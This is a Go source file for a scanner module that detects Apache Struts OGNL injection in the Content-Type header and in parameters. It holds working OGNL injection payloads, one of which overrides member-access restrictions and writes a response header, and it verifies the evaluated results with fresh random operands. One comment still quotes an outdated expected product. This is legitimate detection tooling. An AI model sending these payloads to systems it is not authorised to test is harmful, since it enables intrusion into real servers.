package struts_ognl_injection

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

const (
	ognlMultA = 41273
	ognlMultB = 39127
)

// ognlResult is the product the injected OGNL expression evaluates to. It is
// COMPUTED from the operands rather than hardcoded: a prior literal ("1614244871")
// did not actually equal 41273*39127 (=1614888671), so the module searched for a
// product no real Struts target ever returns and its genuine detection was broken.
// Deriving it keeps the marker in lockstep with the operands forever. The product
// fits under Java's 32-bit Integer.MAX_VALUE, so OGNL's int*int does not overflow.
var ognlResult = strconv.Itoa(ognlMultA * ognlMultB)

// ognlPrimaryExpr is the literal multiplication embedded in the math payloads
// (ognlMultA*ognlMultB). The reflection-tracking confirmation swaps exactly this
// substring for a fresh random expression to re-derive a probe, so it must match
// the operands the payloads are built from.
var ognlPrimaryExpr = strconv.Itoa(ognlMultA) + "*" + strconv.Itoa(ognlMultB)

// confirmOgnlEvaluates re-injects the matched OGNL math payload with FRESH random
// operands (modkit.FreshMultExpr, whose 4-digit operands keep the product under
// Java's 32-bit Integer.MAX_VALUE so OGNL's int*int does not overflow) and requires
// the newly-computed product to appear in the response each round. reinject applies
// a payload string to the request exactly as the matching probe did (Content-Type
// rewrite or insertion-point build) and returns the raw request (ok=false when it
// cannot be rebuilt). A genuine OGNL evaluation tracks the changing operands every
// round; a page that merely contains the fixed product (1614888671 — a plausible id
// / old unix timestamp) cannot predict a fresh random product, so it is dropped.
//
// A matched payload that does NOT carry the A*B expression (the X-Struts-Test
// header-add variant, which bakes the literal product) is already corroborated by
// the injected response header, so it is treated as confirmed. Returns
// (confirmed, err): err != nil (transport/parse failure) makes the caller fail
// OPEN rather than suppress a genuine finding.
func (m *Module) confirmOgnlEvaluates(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	matchedPayload string,
	reinject func(payload string) ([]byte, bool),
) (bool, error) {
	if !strings.Contains(matchedPayload, ognlPrimaryExpr) {
		return true, nil // header-corroborated variant: no A*B expression to track
	}
	const rounds = 2
	for i := 0; i < rounds; i++ {
		freshExpr, product := modkit.FreshMultExpr()
		payload := strings.Replace(matchedPayload, ognlPrimaryExpr, freshExpr, 1)

		raw, ok := reinject(payload)
		if !ok {
			return true, nil // cannot rebuild the probe → fail open
		}
		req := httpmsg.NewRequestResponseRaw(raw, ctx.Service())
		resp, _, err := httpClient.Execute(req, http.Options{NoClustering: true})
		if err != nil {
			return false, err
		}
		if resp.Response() == nil {
			resp.Close()
			return false, fmt.Errorf("struts-ognl confirmation: nil response")
		}
		hit := strings.Contains(resp.Body().String(), product)
		resp.Close()
		if !hit {
			return false, nil // fresh product did not evaluate → coincidental match
		}
	}
	return true, nil
}

// contentTypePayload defines a Content-Type OGNL injection test case.
type contentTypePayload struct {
	name        string
	contentType string
}

var contentTypePayloads = []contentTypePayload{
	{
		name:        "struts2-ct-ognl",
		contentType: fmt.Sprintf("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('X-Struts-Test','%d'))}", ognlMultA*ognlMultB),
	},
	{
		name:        "struts2-ct-simple",
		contentType: fmt.Sprintf("%%{%d*%d}", ognlMultA, ognlMultB),
	},
}

// paramPayload defines a parameter-level OGNL injection test case.
type paramPayload struct {
	payload string
}

var paramPayloads = []paramPayload{
	{payload: fmt.Sprintf("%%{%d*%d}", ognlMultA, ognlMultB)},
	{payload: fmt.Sprintf("${%d*%d}", ognlMultA, ognlMultB)},
}

// Module implements the Struts OGNL injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds  dedup.Lazy[dedup.DiskSet]
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new Struts OGNL Injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest|modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		ds:  dedup.LazyDiskSet("struts_ognl_injection"),
		rhm: dedup.LazyDefaultRHM("struts_ognl_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ConfirmsByBodyDifferential opts this module into the executor's body-
// differential safety net: a candidate finding is re-confirmed by replaying the
// OGNL payload request and verifying the evaluated result reproducibly appears
// as content absent from the clean baseline before being reported.
func (m *Module) ConfirmsByBodyDifferential() bool { return true }

// ScanPerRequest tests Content-Type header OGNL injection (CVE-2017-5638 style).
func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if utils.IsMediaAndJSURL(urlx.Path) {
		return nil, nil
	}

	// Dedup by host+path
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	hash := utils.Sha1(fmt.Sprintf("%s%s", urlx.Host, urlx.Path))
	if diskSet != nil && diskSet.IsSeen(hash) {
		return nil, nil
	}

	for _, p := range contentTypePayloads {
		modifiedRaw, err := httpmsg.SetContentType(ctx.Request().Raw(), p.contentType)
		if err != nil {
			continue
		}

		// SetContentType produces well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}

		// Check for OGNL evaluation evidence
		body := resp.Body().String()
		fullResp := resp.FullResponseString()

		if strings.Contains(body, ognlResult) || strings.Contains(fullResp, "X-Struts-Test") && strings.Contains(fullResp, ognlResult) {
			resp.Close()
			// Confirm the result tracks fresh operands before reporting a Critical
			// finding: a page that contains 1614244871 for an unrelated reason would
			// otherwise match the fixed product without any OGNL ever evaluating.
			ctVal := p.contentType
			if confirmed, cerr := m.confirmOgnlEvaluates(ctx, httpClient, ctVal, func(payload string) ([]byte, bool) {
				raw, err := httpmsg.SetContentType(ctx.Request().Raw(), payload)
				return raw, err == nil
			}); cerr == nil && !confirmed {
				continue
			}
			result := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(modifiedRaw),
				Response:         fullResp,
				FuzzingParameter: "Content-Type",
				ExtractedResults: []string{ognlResult},
				Info: output.Info{
					Name:        fmt.Sprintf("Struts OGNL Injection: %s", p.name),
					Description: fmt.Sprintf("OGNL expression evaluated in Content-Type header — result %q found in response", ognlResult),
				},
			}
			return []*output.ResultEvent{result}, nil
		}
		resp.Close()
	}

	return nil, nil
}

// ScanPerInsertionPoint tests parameter-level OGNL injection.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Dedup by request hash + param via RHM
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	for _, p := range paramPayloads {
		fuzzedRaw := ip.BuildRequest([]byte(p.payload))

		// BuildRequest produces well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}

		body := resp.Body().String()
		if strings.Contains(body, ognlResult) {
			fullResp := resp.FullResponseString()
			resp.Close()
			// Confirm the result tracks fresh operands before reporting a Critical
			// finding (the fixed product appearing in the page by coincidence must
			// not flag).
			if confirmed, cerr := m.confirmOgnlEvaluates(ctx, httpClient, p.payload, func(payload string) ([]byte, bool) {
				return ip.BuildRequest([]byte(payload)), true
			}); cerr == nil && !confirmed {
				continue
			}
			result := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(fuzzedRaw),
				Response:         fullResp,
				FuzzingParameter: ip.Name(),
				ExtractedResults: []string{ognlResult},
				Info: output.Info{
					Name:        "Struts OGNL Injection: parameter",
					Description: fmt.Sprintf("OGNL expression evaluated in parameter %q — result %q found in response", ip.Name(), ognlResult),
				},
			}
			return []*output.ResultEvent{result}, nil
		}
		resp.Close()
	}

	return nil, nil
}
